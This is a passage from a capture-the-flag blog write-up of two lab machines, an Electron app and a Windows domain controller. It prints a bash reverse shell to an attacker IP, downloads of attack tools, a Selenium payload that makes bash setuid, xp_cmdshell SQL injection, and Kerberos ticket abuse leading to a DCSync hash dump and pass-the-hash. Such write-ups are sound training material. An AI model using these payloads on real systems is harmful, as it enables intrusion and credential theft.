<p>The only exploitation path we can see is we assume that there is a bot that’s either downloading the files or clicking the urls (or maybe both?).</p>
<p>To achieve RCE, we will trick the bot into opening our malicious <code>.desktop</code> file which will contain our reverse shell:</p>
<div class="relative"><pre><code class="language-ini code-highlight"><span class="code-line"><span class="token section"><span class="token punctuation">[</span><span class="token section-name selector">Desktop Entry</span><span class="token punctuation">]</span></span>
</span><span class="code-line"><span class="token key attr-name">Exec</span><span class="token punctuation">=</span><span class="token value attr-value">bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.57/443 0&gt;&amp;1&quot;</span>
</span><span class="code-line"><span class="token key attr-name">Type</span><span class="token punctuation">=</span><span class="token value attr-value">Application</span>
</span></code></pre></div>
<p>We will trick the user to open our link, which will be passed to <code>shell.openExternal</code>:</p>
<div class="relative"><pre><code class="language-html code-highlight"><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>an<span class="token punctuation">&quot;</span></span> <span class="token attr-name">open</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>LINK<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</span></code></pre></div>
<p>At this point, we don’t know whether the bot will download the script or not. We can try both approachs.</p>
<ol>
<li>The easy way is just to host the file in a localwebserver.</li>
</ol>
<div class="relative"><pre><code class="language-html code-highlight"><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>an<span class="token punctuation">&quot;</span></span> <span class="token attr-name">open</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://ip:port/pwn.desktop<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</span></code></pre></div>
<ol start="2">
<li>The other way is to hope that downloads the file.<!-- -->
<blockquote>
<p>Spoilers: the bot also downloads the file u.u</p>
</blockquote>
</li>
</ol>
<p>We know from the source that it gets downloaded in <code>/opt/userland</code> and we retrieve the random file name with two ways as well.</p>
<ol>
<li>Downloading the file locally using the gui, we need to create a writeable /opt/userland in our local system)</li>
<li>Using the Web API to upload the file and the filename will be in the response</li>
</ol>
<p>In this case our payload will be:</p>
<div class="relative"><pre><code class="language-html code-highlight"><span class="code-line"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>an<span class="token punctuation">&quot;</span></span> <span class="token attr-name">open</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>file:///opt/userland/5b208f3cb06c3d4a44afa8c948f9aa35.desktop<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>test<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
</span></code></pre></div>
<p>Once we make sure the payload is hosted/downloaded we can send the HTML payload and wait until we get a shell.</p>
<p><img src="/static/images/stack-the-flags-2022/payload-xss-rendered.png" alt="A screenshot that shows that our XSS payload is rendered"/></p>
<p>And we get a shell back!</p>
<p><img src="/static/images/stack-the-flags-2022/user-flag-john.png" alt="A screenshot where we got a shell back as john"/></p>
<h3 id="privilege-escalation-1"><a href="#privilege-escalation-1" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Privilege Escalation</h3>
<p>The first thing I’ve checked is the running processes as <code>root</code>. In this case, I’ve found a Selenium server running as root locally.</p>
<div class="relative"><pre><code class="language-bash code-highlight"><span class="code-line">root         <span class="token number">623</span>       <span class="token number">1</span>  <span class="token number">0</span> <span class="token number">14</span>:12 ?        00:00:00 /usr/sbin/cron -f -P
</span><span class="code-line">root         <span class="token number">638</span>     <span class="token number">623</span>  <span class="token number">0</span> <span class="token number">14</span>:12 ?        00:00:00  <span class="token punctuation">\</span>_ /usr/sbin/CRON -f -P
</span><span class="code-line">root         <span class="token number">641</span>     <span class="token number">638</span>  <span class="token number">0</span> <span class="token number">14</span>:12 ?        00:00:00      <span class="token punctuation">\</span>_ /bin/sh -c java -jar /root/selenium-server-4.4.0.jar standalone --host <span class="token number">127.0</span>.0.1
</span><span class="code-line">root         <span class="token number">643</span>     <span class="token number">641</span>  <span class="token number">0</span> <span class="token number">14</span>:12 ?        00:00:31          <span class="token punctuation">\</span>_ java -jar /root/selenium-server-4.4.0.jar standalone --host <span class="token number">127.0</span>.0.1
</span></code></pre></div>
<p>The idea behind exploiting Selenium is to create a session that executes code. In simpler words, we can achieve RCE through geckodriver.</p>
<p>First I’ll forward the port <code>4444</code> running locally on the machine to my local machine using <code>chisel</code>. I’ll run a chisel server on my machine:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:~/htb-trustable » chisel server -p 8888 --reverse
</span><span class="code-line">2022/12/05 06:10:10 server: Reverse tunnelling enabled
</span><span class="code-line">2022/12/05 06:10:10 server: Fingerprint H7MAdhulXPbLGvJaJWk7UmAzd8e/4NPB4rlR4eDaklQ=
</span><span class="code-line">2022/12/05 06:10:10 server: Listening on http://0.0.0.0:8888
</span></code></pre></div>
<p>Download chisel to the remote machine and I’ll forward the port:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">john@electrogrid:/dev/shm$ wget 10.10.14.57/chisel
</span><span class="code-line">john@electrogrid:/dev/shm$ chmod +x ./chisel
</span><span class="code-line">john@electrogrid:/dev/shm$ ./chisel client 10.10.14.57./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &amp;
</span><span class="code-line">./chisel client 10.10.14.57:8888 R:4444:127.0.0.1:4444 &amp;
</span></code></pre></div>
<p>And we’ll get a connection.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">2022/12/05 06:11:47 server: session#1: tun: proxy#R:4444=&gt;4444: Listening
</span></code></pre></div>
<p>Now we can access the Selenium Grid from our machine.</p>
<p><img src="/static/images/stack-the-flags-2022/selenium-grid-web.png" alt="A screenshot of Selenium web grid interface"/></p>
<p>And now I’ll create the malicious session where it will set the <code>suid</code> bit to the <code>/bin/bash</code> binary.</p>
<div class="relative"><pre><code class="language-http code-highlight"><span class="code-line"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url"><span class="token path"><span class="token path-separator">/</span>wd<span class="token path-separator">/</span>hub<span class="token path-separator">/</span>session</span></span> <span class="token http-version property">HTTP/1.1</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">localhost:4444</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">python-requests/2.27.1</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">*/*</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json;charset=utf-8</span></span>
</span><span class="code-line"><span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">276</span></span>
</span><span class="code-line">
</span><span class="code-line"> {
</span><span class="code-line">    &quot;capabilities&quot;: {
</span><span class="code-line">        &quot;alwaysMatch&quot;: {
</span><span class="code-line">            &quot;browserName&quot;: &quot;chrome&quot;,
</span><span class="code-line">            &quot;goog:chromeOptions&quot;: {
</span><span class="code-line">                &quot;binary&quot;: &quot;/usr/bin/python3&quot;,
</span><span class="code-line">                &quot;args&quot;: [&quot;-cimport os;os.system(&#x27;chmod u+s /bin/bash&#x27;)&quot;]
</span><span class="code-line">            }
</span><span class="code-line">        }
</span><span class="code-line">    }
</span><span class="code-line">}
</span></code></pre></div>
<p>After making the request, we can see in the UI that our request is in queue.</p>
<p><img src="/static/images/stack-the-flags-2022/selenium-web-queue.png" alt="A screenshot of the Selenium Web queue that shows our payload"/></p>
<p>Once it disappears from the queue, it means it’s finished.</p>
<p>We can go back to the remote machine and check.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">john@electrogrid:/dev/shm$ ls -la /bin/bash           ls -la /bin/bash
</span><span class="code-line">ls -la /bin/bash
</span><span class="code-line">-rwsr-xr-x 1 root root 1396520 Jan  6  2022 /bin/bash
</span></code></pre></div>
<p>And it worked!</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">john@electrogrid:/dev/shm$ /bin/bash -p               /bin/bash -p
</span><span class="code-line">/bin/bash -p
</span><span class="code-line">id
</span><span class="code-line">uid=1000(john) gid=1000(john) euid=0(root) groups=1000(john)
</span><span class="code-line">cat /root/root.txt
</span><span class="code-line">STF22{bbe7145febbce7ddd4dd3e22a37e93d1}
</span></code></pre></div>
<p>And thats it for this one!</p>
<h2 id="lookout-fullpwn-2000-points"><a href="#lookout-fullpwn-2000-points" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Lookout (Fullpwn, 2000 Points)</h2>
<p>Note: This will be a short writeup as I used two unintended ways to get system on the machine.</p>
<h3 id="enumeration-2"><a href="#enumeration-2" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Enumeration</h3>
<p>I’ll start with an <code>nmap</code> scan with the usual options:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">Discovered open port 80/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 135/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 445/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 139/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 53/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 3269/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 389/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 88/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 636/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 3268/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 593/tcp on 10.129.254.249
</span><span class="code-line">Discovered open port 464/tcp on 10.129.254.249
</span></code></pre></div>
<p>For the sake of the writeup, I’ll jump straight to the webserver on port 80, where we have a way to execute some commands such as <code>ping</code>, <code>traceroute</code>, and <code>nslookup</code>.</p>
<p><img src="/static/images/stack-the-flags-2022/Lookout-Utility-WebPage.png" alt="A screenshot of the Lookout Utility WebPage"/></p>
<p>This page is not vulnerable to anything, so I’ll just ping my box for now:</p>
<p><img src="/static/images/stack-the-flags-2022/Scan-Results.png" alt="A screenshot of the Scan Results that we runned through the utility"/></p>
<p>We can check in the <code>Past Scans</code> that our scan was created!</p>
<p><img src="/static/images/stack-the-flags-2022/Past-Results.png" alt="A screenshot that shows all the Past Results"/></p>
<p>We can notice that we delete the scan with the X under action. I’ll intercept that request using burp to play a bit with it:</p>
<p><img src="/static/images/stack-the-flags-2022/request-delete-scan.png" alt="A screenshot that shows the request delete scan"/></p>
<p>After a few tries, I noticed it was vulnerable to an SQLi:</p>
<p><img src="/static/images/stack-the-flags-2022/testing-sqli-sleep.png" alt="A screenshot where we test testing SQLi sleep and that shows the 5 seconds delay"/></p>
<h3 id="exploitation-2"><a href="#exploitation-2" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Exploitation</h3>
<p>The first thing I’ve tried was to enable <code>xp_cmdshell</code> and use it get code execution:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">EXEC sp_configure &#x27;show advanced options&#x27;, 1
</span><span class="code-line">RECONFIGURE-- -
</span><span class="code-line">EXEC sp_configure &#x27;xp_cmdshell&#x27;, &#x27;1&#x27;
</span><span class="code-line">RECONFIGURE
</span></code></pre></div>
<p><img src="/static/images/stack-the-flags-2022/configure1.png" alt="A screenshot of xp_cmdshell configuration"/></p>
<p><img src="/static/images/stack-the-flags-2022/configure2.png" alt="A screenshot of xp_cmdshell configuration"/></p>
<p><img src="/static/images/stack-the-flags-2022/configure3.png" alt="A screenshot of xp_cmdshell configuration"/></p>
<p>Then we can use <code>EXEC xp_cmdshell &#x27;&lt;COMMAND&gt;&#x27;</code>.</p>
<p><img src="/static/images/stack-the-flags-2022/rce-sqli.png" alt="A screenshot of executing xp_cmdshell to get a reverse shell through powershell"/></p>
<p>And we get a shell as the nt service:</p>
<p><img src="/static/images/stack-the-flags-2022/shell-as-service-nt.png" alt="A screenshot of getting a shell as nt service"/></p>
<blockquote>
<p>Nothing that we can directly get a shell with sqlmap</p>
</blockquote>
<p><img src="/static/images/stack-the-flags-2022/sqlmap-result.png" alt="A screenshot that shows the sqlmap results"/></p>
<h3 id="privilege-escalation-2"><a href="#privilege-escalation-2" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Privilege Escalation</h3>
<p>Since we have a shell as service account. we can get system directly with two ways.</p>
<h4 id="first-way"><a href="#first-way" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>First Way</h4>
<p>The Service accounts are vulnerable to TGT delegation attacks using Rubeus because the service account is often configured with high privileges on the local system, such as the ability to create and modify user accounts and other system resources.</p>
<p>The idea is to get valid TGT (Ticket-Granting Ticket) for the service account, to perform a DCSync attack and then PSExec into the machine as administrator.</p>
<p>First I’ll upload Rubeus to the remove machine.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">PS C:\Windows\System32\spool\drivers\color&gt; wget 10.10.14.57/Rubeus.exe -o r.exe
</span></code></pre></div>
<p>Then I’ll use it to generate a TGT for the service account.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">PS C:\Windows\System32\spool\drivers\color&gt; .\r.exe tgtdeleg /nowrap
</span><span class="code-line">.\r.exe tgtdeleg /nowrap
</span><span class="code-line">
</span><span class="code-line">   ______        _
</span><span class="code-line">  (_____ \      | |
</span><span class="code-line">   _____) )_   _| |__  _____ _   _  ___
</span><span class="code-line">  |  __  /| | | |  _ \| ___ | | | |/___)
</span><span class="code-line">  | |  \ \| |_| | |_) ) ____| |_| |___ |
</span><span class="code-line">  |_|   |_|____/|____/|_____)____/(___/
</span><span class="code-line">
</span><span class="code-line">  v2.2.0
</span><span class="code-line">
</span><span class="code-line">
</span><span class="code-line">[*] Action: Request Fake Delegation TGT (current user)
</span><span class="code-line">
</span><span class="code-line">[*] No target SPN specified, attempting to build &#x27;cifs/dc.domain.com&#x27;
</span><span class="code-line">[*] Initializing Kerberos GSS-API w/ fake delegation for target &#x27;cifs/LOOKOUT-DC.LOOKOUT.local&#x27;
</span><span class="code-line">[+] Kerberos GSS-API initialization success!
</span><span class="code-line">[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
</span><span class="code-line">[*] Found the AP-REQ delegation ticket in the GSS-API output.
</span><span class="code-line">[*] Authenticator etype: aes256_cts_hmac_sha1
</span><span class="code-line">[*] Extracted the service ticket session key from the ticket cache: CYLfo1W5+vf4ZTDXhdsbhxx6n45eG6ONzEKGryITLUg=
</span><span class="code-line">[+] Successfully decrypted the authenticator
</span><span class="code-line">[*] base64(ticket.kirbi):
</span><span class="code-line">
</span><span class="code-line">      doIF3jCCBdqgA&lt;SNIIIIIIIIIP&gt;AWoAMCAQGFM
</span></code></pre></div>
<p>I’ll save to my local machine and convert the ticket with <code>TicketConverter</code> from <code>impacket</code>.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:/tmp/wr » cat ticket| base64 -d &gt; ticket.kirbi
</span><span class="code-line">hcue@pjsk:/tmp/wr » impacket-ticketConverter ticket.kirbi ticket.ccache
</span><span class="code-line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
</span><span class="code-line">
</span><span class="code-line">[*] converting kirbi to ccache...
</span><span class="code-line">[+] done
</span></code></pre></div>
<p>Then I’ll export it to my env variables.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:/tmp/wr » export KRB5CCNAME=/tmp/wr/ticket.ccache
</span></code></pre></div>
<p>One last thing, we need to synchronize our local time to the server, otherwise it won’t work.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">sudo ntpdate 10.129.254.249
</span></code></pre></div>
<p>Now to perform a DCSync on the target, we can use impacket’s <code>secretsdump.py</code> script to extract all the hashes from the domain controller. We need to specify kerberos authentication and no password for this operation.</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:/tmp/wr » impacket-secretsdump LOOKOUT-DC.LOOKOUT.local -dc-ip 10.129.254.249 -no-pass -k
</span><span class="code-line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
</span><span class="code-line">
</span><span class="code-line">[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
</span><span class="code-line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
</span><span class="code-line">[*] Using the DRSUAPI method to get NTDS.DIT secrets
</span><span class="code-line">Administrator:500:aad3b435b51404eeaad3b435b51404ee:cb313353c5eaceb1aae589b1644737bb:::
</span><span class="code-line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
</span><span class="code-line">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ab92b60e75818bbb70ca754897aa1e37:::
</span><span class="code-line">LOOKOUT.local\lhuman:1104:aad3b435b51404eeaad3b435b51404ee:de9ca94a6f5ea9113d3370476e42a9cb:::
</span><span class="code-line">LOOKOUT.local\fhuman:1105:aad3b435b51404eeaad3b435b51404ee:1501f896cae1fd4f0bf6b9593e81dea3:::
</span><span class="code-line">LOOKOUT.local\shuman:1106:aad3b435b51404eeaad3b435b51404ee:f4c0320c516b4eeae0533e930beee3c3:::
</span><span class="code-line">LOOKOUT-DC$:1001:aad3b435b51404eeaad3b435b51404ee:440f42cdda7c8d86dedc9655e8c003d0:::
</span><span class="code-line">&lt;SNIP&gt;
</span></code></pre></div>
<p>Now with the administrator hash we can <code>psexec</code> into the machine:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:/tmp/wr » impacket-psexec Administrator@10.129.254.249 -hashes :cb313353c5eaceb1aae589b1644737bb     1 ↵
</span><span class="code-line">Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
</span><span class="code-line">
</span><span class="code-line">[*] Requesting shares on 10.129.254.249.....
</span><span class="code-line">[*] Found writable share ADMIN$
</span><span class="code-line">[*] Uploading file HeqMQBmt.exe
</span><span class="code-line">[*] Opening SVCManager on 10.129.254.249.....
</span><span class="code-line">[*] Creating service bqIM on 10.129.254.249.....
</span><span class="code-line">[*] Starting service bqIM.....
</span><span class="code-line">[!] Press help for extra shell commands
</span><span class="code-line">Microsoft Windows [Version 10.0.17763.3650]
</span><span class="code-line">(c) 2018 Microsoft Corporation. All rights reserved.
</span><span class="code-line">
</span><span class="code-line">C:\Windows\system32&gt; whoami
</span><span class="code-line">nt authority\system
</span></code></pre></div>
<p>And then we grab both flags :D!</p>
<h4 id="second-way"><a href="#second-way" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Second Way</h4>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">PS C:\Windows\system32&gt; whoami /priv
</span><span class="code-line">whoami /priv
</span><span class="code-line">
</span><span class="code-line">PRIVILEGES INFORMATION
</span><span class="code-line">----------------------
</span><span class="code-line">
</span><span class="code-line">Privilege Name                Description                               State
</span><span class="code-line">============================= ========================================= ========
</span><span class="code-line">SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
</span><span class="code-line">SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
</span><span class="code-line">SeMachineAccountPrivilege     Add workstations to domain                Disabled
</span><span class="code-line">SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
</span><span class="code-line">SeManageVolumePrivilege       Perform volume maintenance tasks          Enabled
</span><span class="code-line">SeImpersonatePrivilege        Impersonate a client after authentication Enabled
</span><span class="code-line">SeCreateGlobalPrivilege       Create global objects                     Enabled
</span><span class="code-line">SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
</span></code></pre></div>
<p>We have <code>SeImpersonatePrivilege</code> Enabled. Since this is a Windows Server 2019, most of the known Potatos will not work. But likely, there is new potato that could exploit <code>SEimpersonatePrivilege</code> using <code>EfsRpc</code>.</p>
<blockquote>
<p><a target="_blank" rel="noopener noreferrer" href="https://github.com/bugch3ck/SharpEfsPotato">https://github.com/bugch3ck/SharpEfsPotato</a></p>
</blockquote>
<p>We compile it with Visual Studio and upload it to the remote machine:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">PS C:\Windows\System32\spool\drivers\color&gt; wget 10.10.14.57/xc_10.10.14.57_443.exe -o xc_10.10.14.57_443.exe
</span><span class="code-line">
</span><span class="code-line">PS C:\Windows\System32\spool\drivers\color&gt; wget 10.10.14.57/SharpEfsPotato.exe -o SharpEfsPotato.exe
</span></code></pre></div>
<p>And then execute my reverse shell:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">PS C:\Windows\System32\spool\drivers\color&gt; .\SharpEfsPotato.exe -p C:\Windows\System32\spool\drivers\color\xc_10.10.14.57_443.exe
</span><span class="code-line">SharpEfsPotato by @bugch3ck
</span><span class="code-line">  Local privilege escalation from SeImpersonatePrivilege using EfsRpc.
</span><span class="code-line">
</span><span class="code-line">  Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.
</span><span class="code-line">
</span><span class="code-line">[+] Triggering name pipe access on evil PIPE \\localhost/pipe/d112edc0-75de-4d57-8696-f7b9847761a6/\d112edc0-75de-4d57-8696-f7b9847761a6\d112edc0-75de-4d57-8696-f7b9847761a6
</span><span class="code-line">df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
</span><span class="code-line">[x]RpcBindingSetAuthInfo failed with status 0x6d3
</span><span class="code-line">[+] Server connected to our evil RPC pipe
</span><span class="code-line">[+] Duplicated impersonation token ready for process creation
</span><span class="code-line">[+] Intercepted and authenticated successfully, launching program
</span><span class="code-line">[+] Process created, enjoy!
</span></code></pre></div>
<p>And I grabbed my shell:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">hcue@pjsk:/opt/xc(master○) » ./xc -l -p 443                                                                                                                                                                                            1 ↵
</span><span class="code-line">
</span><span class="code-line">		__  _____
</span><span class="code-line">		\ \/ / __|
</span><span class="code-line">		&gt;  &lt; (__
</span><span class="code-line">		/_/\_\___| by @xct_de
</span><span class="code-line">		           build: XBWQOEYPUG
</span><span class="code-line">
</span><span class="code-line">2022/12/05 09:05:16 Listening on :443
</span><span class="code-line">2022/12/05 09:05:16 Waiting for connections...
</span><span class="code-line">2022/12/05 09:07:06 Connection from 10.129.254.249:63732
</span><span class="code-line">2022/12/05 09:07:06 Stream established
</span><span class="code-line">
</span><span class="code-line">[*] Auto-Plugins:
</span><span class="code-line">[xc: C:\Windows\system32]: whoami
</span><span class="code-line">nt authority\system
</span><span class="code-line">[xc: C:\Windows\system32]: hostname
</span><span class="code-line">LOOKOUT-DC
</span></code></pre></div></div><div class="pt-6 pb-6 text-sm text-gray-700 dark:text-gray-300"><a target="_blank" rel="nofollow" href="https://mobile.twitter.com/search?q=https%3A%2F%2Fsekai.team%2Fblog%2Fstack-the-flags-2022%2Ffullpwn">Discuss on Twitter</a> • <a target="_blank" rel="noopener noreferrer" href="https://github.com/blueset/sekai.team/blob/master/data/blog/stack-the-flags-2022/fullpwn.md">View on GitHub</a></div></div><footer><div class="text-sm font-medium leading-5 divide-gray-200 xl:divide-y dark:divide-gray-700 xl:col-start-1 xl:row-start-2"><div class="py-4 xl:py-8"><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Tags</h2><div class="flex flex-wrap"><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/stack-the-flags-2022/">STACK-The-Flags-2022</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/fullpwn/">fullpwn</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/electron/">Electron</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/xss/">XSS</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/rce/">RCE</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/selenium/">Selenium</a><a class="mr-3 text-sm font-medium uppercase text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/tags/hackthebox/">HackTheBox</a></div></div><div class="flex justify-between py-4 xl:block xl:space-y-8 xl:py-8"><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Previous Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/gdg-algiers-2022/mlm/">GDG Algiers CTF 2022 – MLM</a></div></div><div><h2 class="text-xs tracking-wide text-gray-500 uppercase dark:text-gray-400">Next Article</h2><div class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400"><a href="/blog/idekctf-2022/nmpz/">idekCTF 2022* – NMPZ</a></div></div></div></div><div class="pt-4 xl:pt-8"><a class="text-primary-500 hover:text-primary-600 dark:hover:text-primary-400" href="/blog/">← Back to the blog</a></div></footer></div></div></article></div></main><footer><div class="flex flex-col items-center mt-16"><div class="flex mb-3 space-x-4"><div class="flex mb-3 space-x-4"><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="mailto:project.sekai@sekai.team"><span class="sr-only"><span class="w-6">mail</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 20" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M2.003 5.884 10 9.882l7.997-3.998A2 2 0 0 0 16 4H4a2 2 0 0 0-1.997 1.884z"></path><path d="m18 8.118-8 4-8-4V14a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8.118z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://github.com/project-sekai-ctf"><span class="sr-only"><span class="w-6">github</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://www.linkedin.com/company/project-sekai-ctf/"><span class="sr-only"><span class="w-6">linkedin</span></span><svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 0 1-2.063-2.065 2.064 2.064 0 1 1 2.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"></path></svg></a><a class="text-sm text-gray-500 transition hover:text-gray-600" target="_blank" rel="noopener noreferrer" href="https://twitter.com/ProjectSEKAIctf"><span class="sr-only"><span class="w-6">twitter</span></span><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" class="fill-current text-gray-700 w-6 h-6 dark:text-gray-200 hover:text-blue-500 dark:hover:text-blue-400"><path d="M23.953 4.57a10 10 0 0 1-2.825.775 4.958 4.958 0 0 0 2.163-2.723c-.951.555-2.005.959-3.127 1.184a4.92 4.92 0 0 0-8.384 4.482C7.69 8.095 4.067 6.13 1.64 3.162a4.822 4.822 0 0 0-.666 